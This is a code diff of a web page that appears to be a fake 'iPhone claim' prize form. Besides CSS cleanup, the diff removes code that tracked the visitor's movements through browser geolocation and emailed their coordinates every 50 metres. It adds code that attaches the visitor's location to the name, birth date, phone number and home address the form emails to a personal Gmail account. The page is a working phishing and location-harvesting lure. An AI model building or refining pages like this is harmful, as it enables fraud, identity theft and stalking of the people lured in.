@@ -13,12 +13,12 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f8ff; /* Light background color to make form visible */
+            background-color: #f0f8ff;
             font-family: Arial, sans-serif;
         }
         .container {
             max-width: 600px;
-            background: #ffffff; /* Solid background color for form */
+            background: #ffffff;
             padding: 2rem;
             border-radius: 10px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
@@ -35,21 +35,12 @@
             font-size: 1rem;
             margin-bottom: 20px;
         }
-        .form-group label {
-            font-weight: bold;
-            color: #444;
-        }
         .form-control {
             border: 1px solid #ccc;
             border-radius: 8px;
             padding: 10px;
             font-size: 1rem;
-            transition: border-color 0.3s;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-        }
-        .form-control:focus {
-            border-color: #007bff;
-            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
+            margin-bottom: 10px;
         }
         .btn-primary {
             background-color: #007bff;
@@ -57,17 +48,6 @@
             border-radius: 8px;
             padding: 10px 20px;
             font-size: 1rem;
-            margin-top: 15px;
-            transition: background-color 0.3s, transform 0.2s;
-        }
-        .btn-primary:hover {
-            background-color: #0056b3;
-            transform: translateY(-2px);
-        }
-        .form-text {
-            font-size: 0.9rem;
-            color: #666;
-            margin-top: 10px;
         }
         #locationDisplay {
             background: #e9ecef;
@@ -75,7 +55,6 @@
             padding: 0.5rem;
             border-radius: 4px;
             margin-top: 15px;
-            font-size: 0.9rem;
         }
     </style>
 </head>
@@ -121,82 +100,31 @@
         </form>
     </div>
 
-    <!-- JavaScript code (unchanged) -->
+    <!-- JavaScript code -->
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
-            let lastSentPosition = null;
+            let latitude = null;
+            let longitude = null;
 
-            function calculateDistance(lat1, lon1, lat2, lon2) {
-                const R = 6371e3;
-                const φ1 = lat1 * Math.PI / 180;
-                const φ2 = lat2 * Math.PI / 180;
-                const Δφ = (lat2 - lat1) * Math.PI / 180;
-                const Δλ = (lon2 - lon1) * Math.PI / 180;
-
-                const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
-                          Math.cos(φ1) * Math.cos(φ2) *
-                          Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
-                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-
-                return R * c;
+            // Get user's location
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                    },
+                    (error) => {
+                        locationDisplay.textContent = "Error retrieving location.";
+                        console.error(error);
+                    }
+                );
+            } else {
+                locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
 
-            function sendLocationEmail(latitude, longitude) {
-                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodini@gmail.com");
-            }
-
-            function trackMovement() {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.watchPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-
-                            if (lastSentPosition) {
-                                const distanceMoved = calculateDistance(
-                                    lastSentPosition.latitude,
-                                    lastSentPosition.longitude,
-                                    latitude,
-                                    longitude
-                                );
-
-                                if (distanceMoved > 50) {
-                                    sendLocationEmail(latitude, longitude);
-                                    lastSentPosition = { latitude, longitude };
-                                }
-                            } else {
-                                lastSentPosition = { latitude, longitude };
-                                sendLocationEmail(latitude, longitude);
-                            }
-                        },
-                        (error) => {
-                            switch (error.code) {
-                                case error.PERMISSION_DENIED:
-                                    locationDisplay.textContent = "Location access denied by user.";
-                                    break;
-                                case error.POSITION_UNAVAILABLE:
-                                    locationDisplay.textContent = "Location information is unavailable.";
-                                    break;
-                                case error.TIMEOUT:
-                                    locationDisplay.textContent = "Location request timed out.";
-                                    break;
-                                default:
-                                    locationDisplay.textContent = "An unknown error occurred.";
-                                    break;
-                            }
-                            sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodini@gmail.com");
-                        },
-                        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-                    );
-                } else {
-                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
-                }
-            }
-
-            trackMovement();
-
+            // Handle form submission
             document.getElementById("rewardForm").addEventListener("submit", function (e) {
                 e.preventDefault();
 
@@ -208,7 +136,7 @@
                 const city = document.getElementById("city").value;
                 const postalCode = document.getElementById("postalCode").value;
 
-                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
+                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
 
                 sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodini@gmail.com");
 
@@ -238,15 +166,10 @@
                     }
                 })
                 .then(data => {
-                    if (data.message) {
-                        console.log("Email sent successfully");
-                    } else if (data.error) {
-                        alert("Error: " + data.error);
-                    }
+                    console.log("Email sent successfully:", data);
                 })
                 .catch(error => {
-                    console.log("Error sending email:", error);
-                    alert("Error sending email: " + error.message);
+                    console.error("Error sending email:", error);
                 });
             }
         });
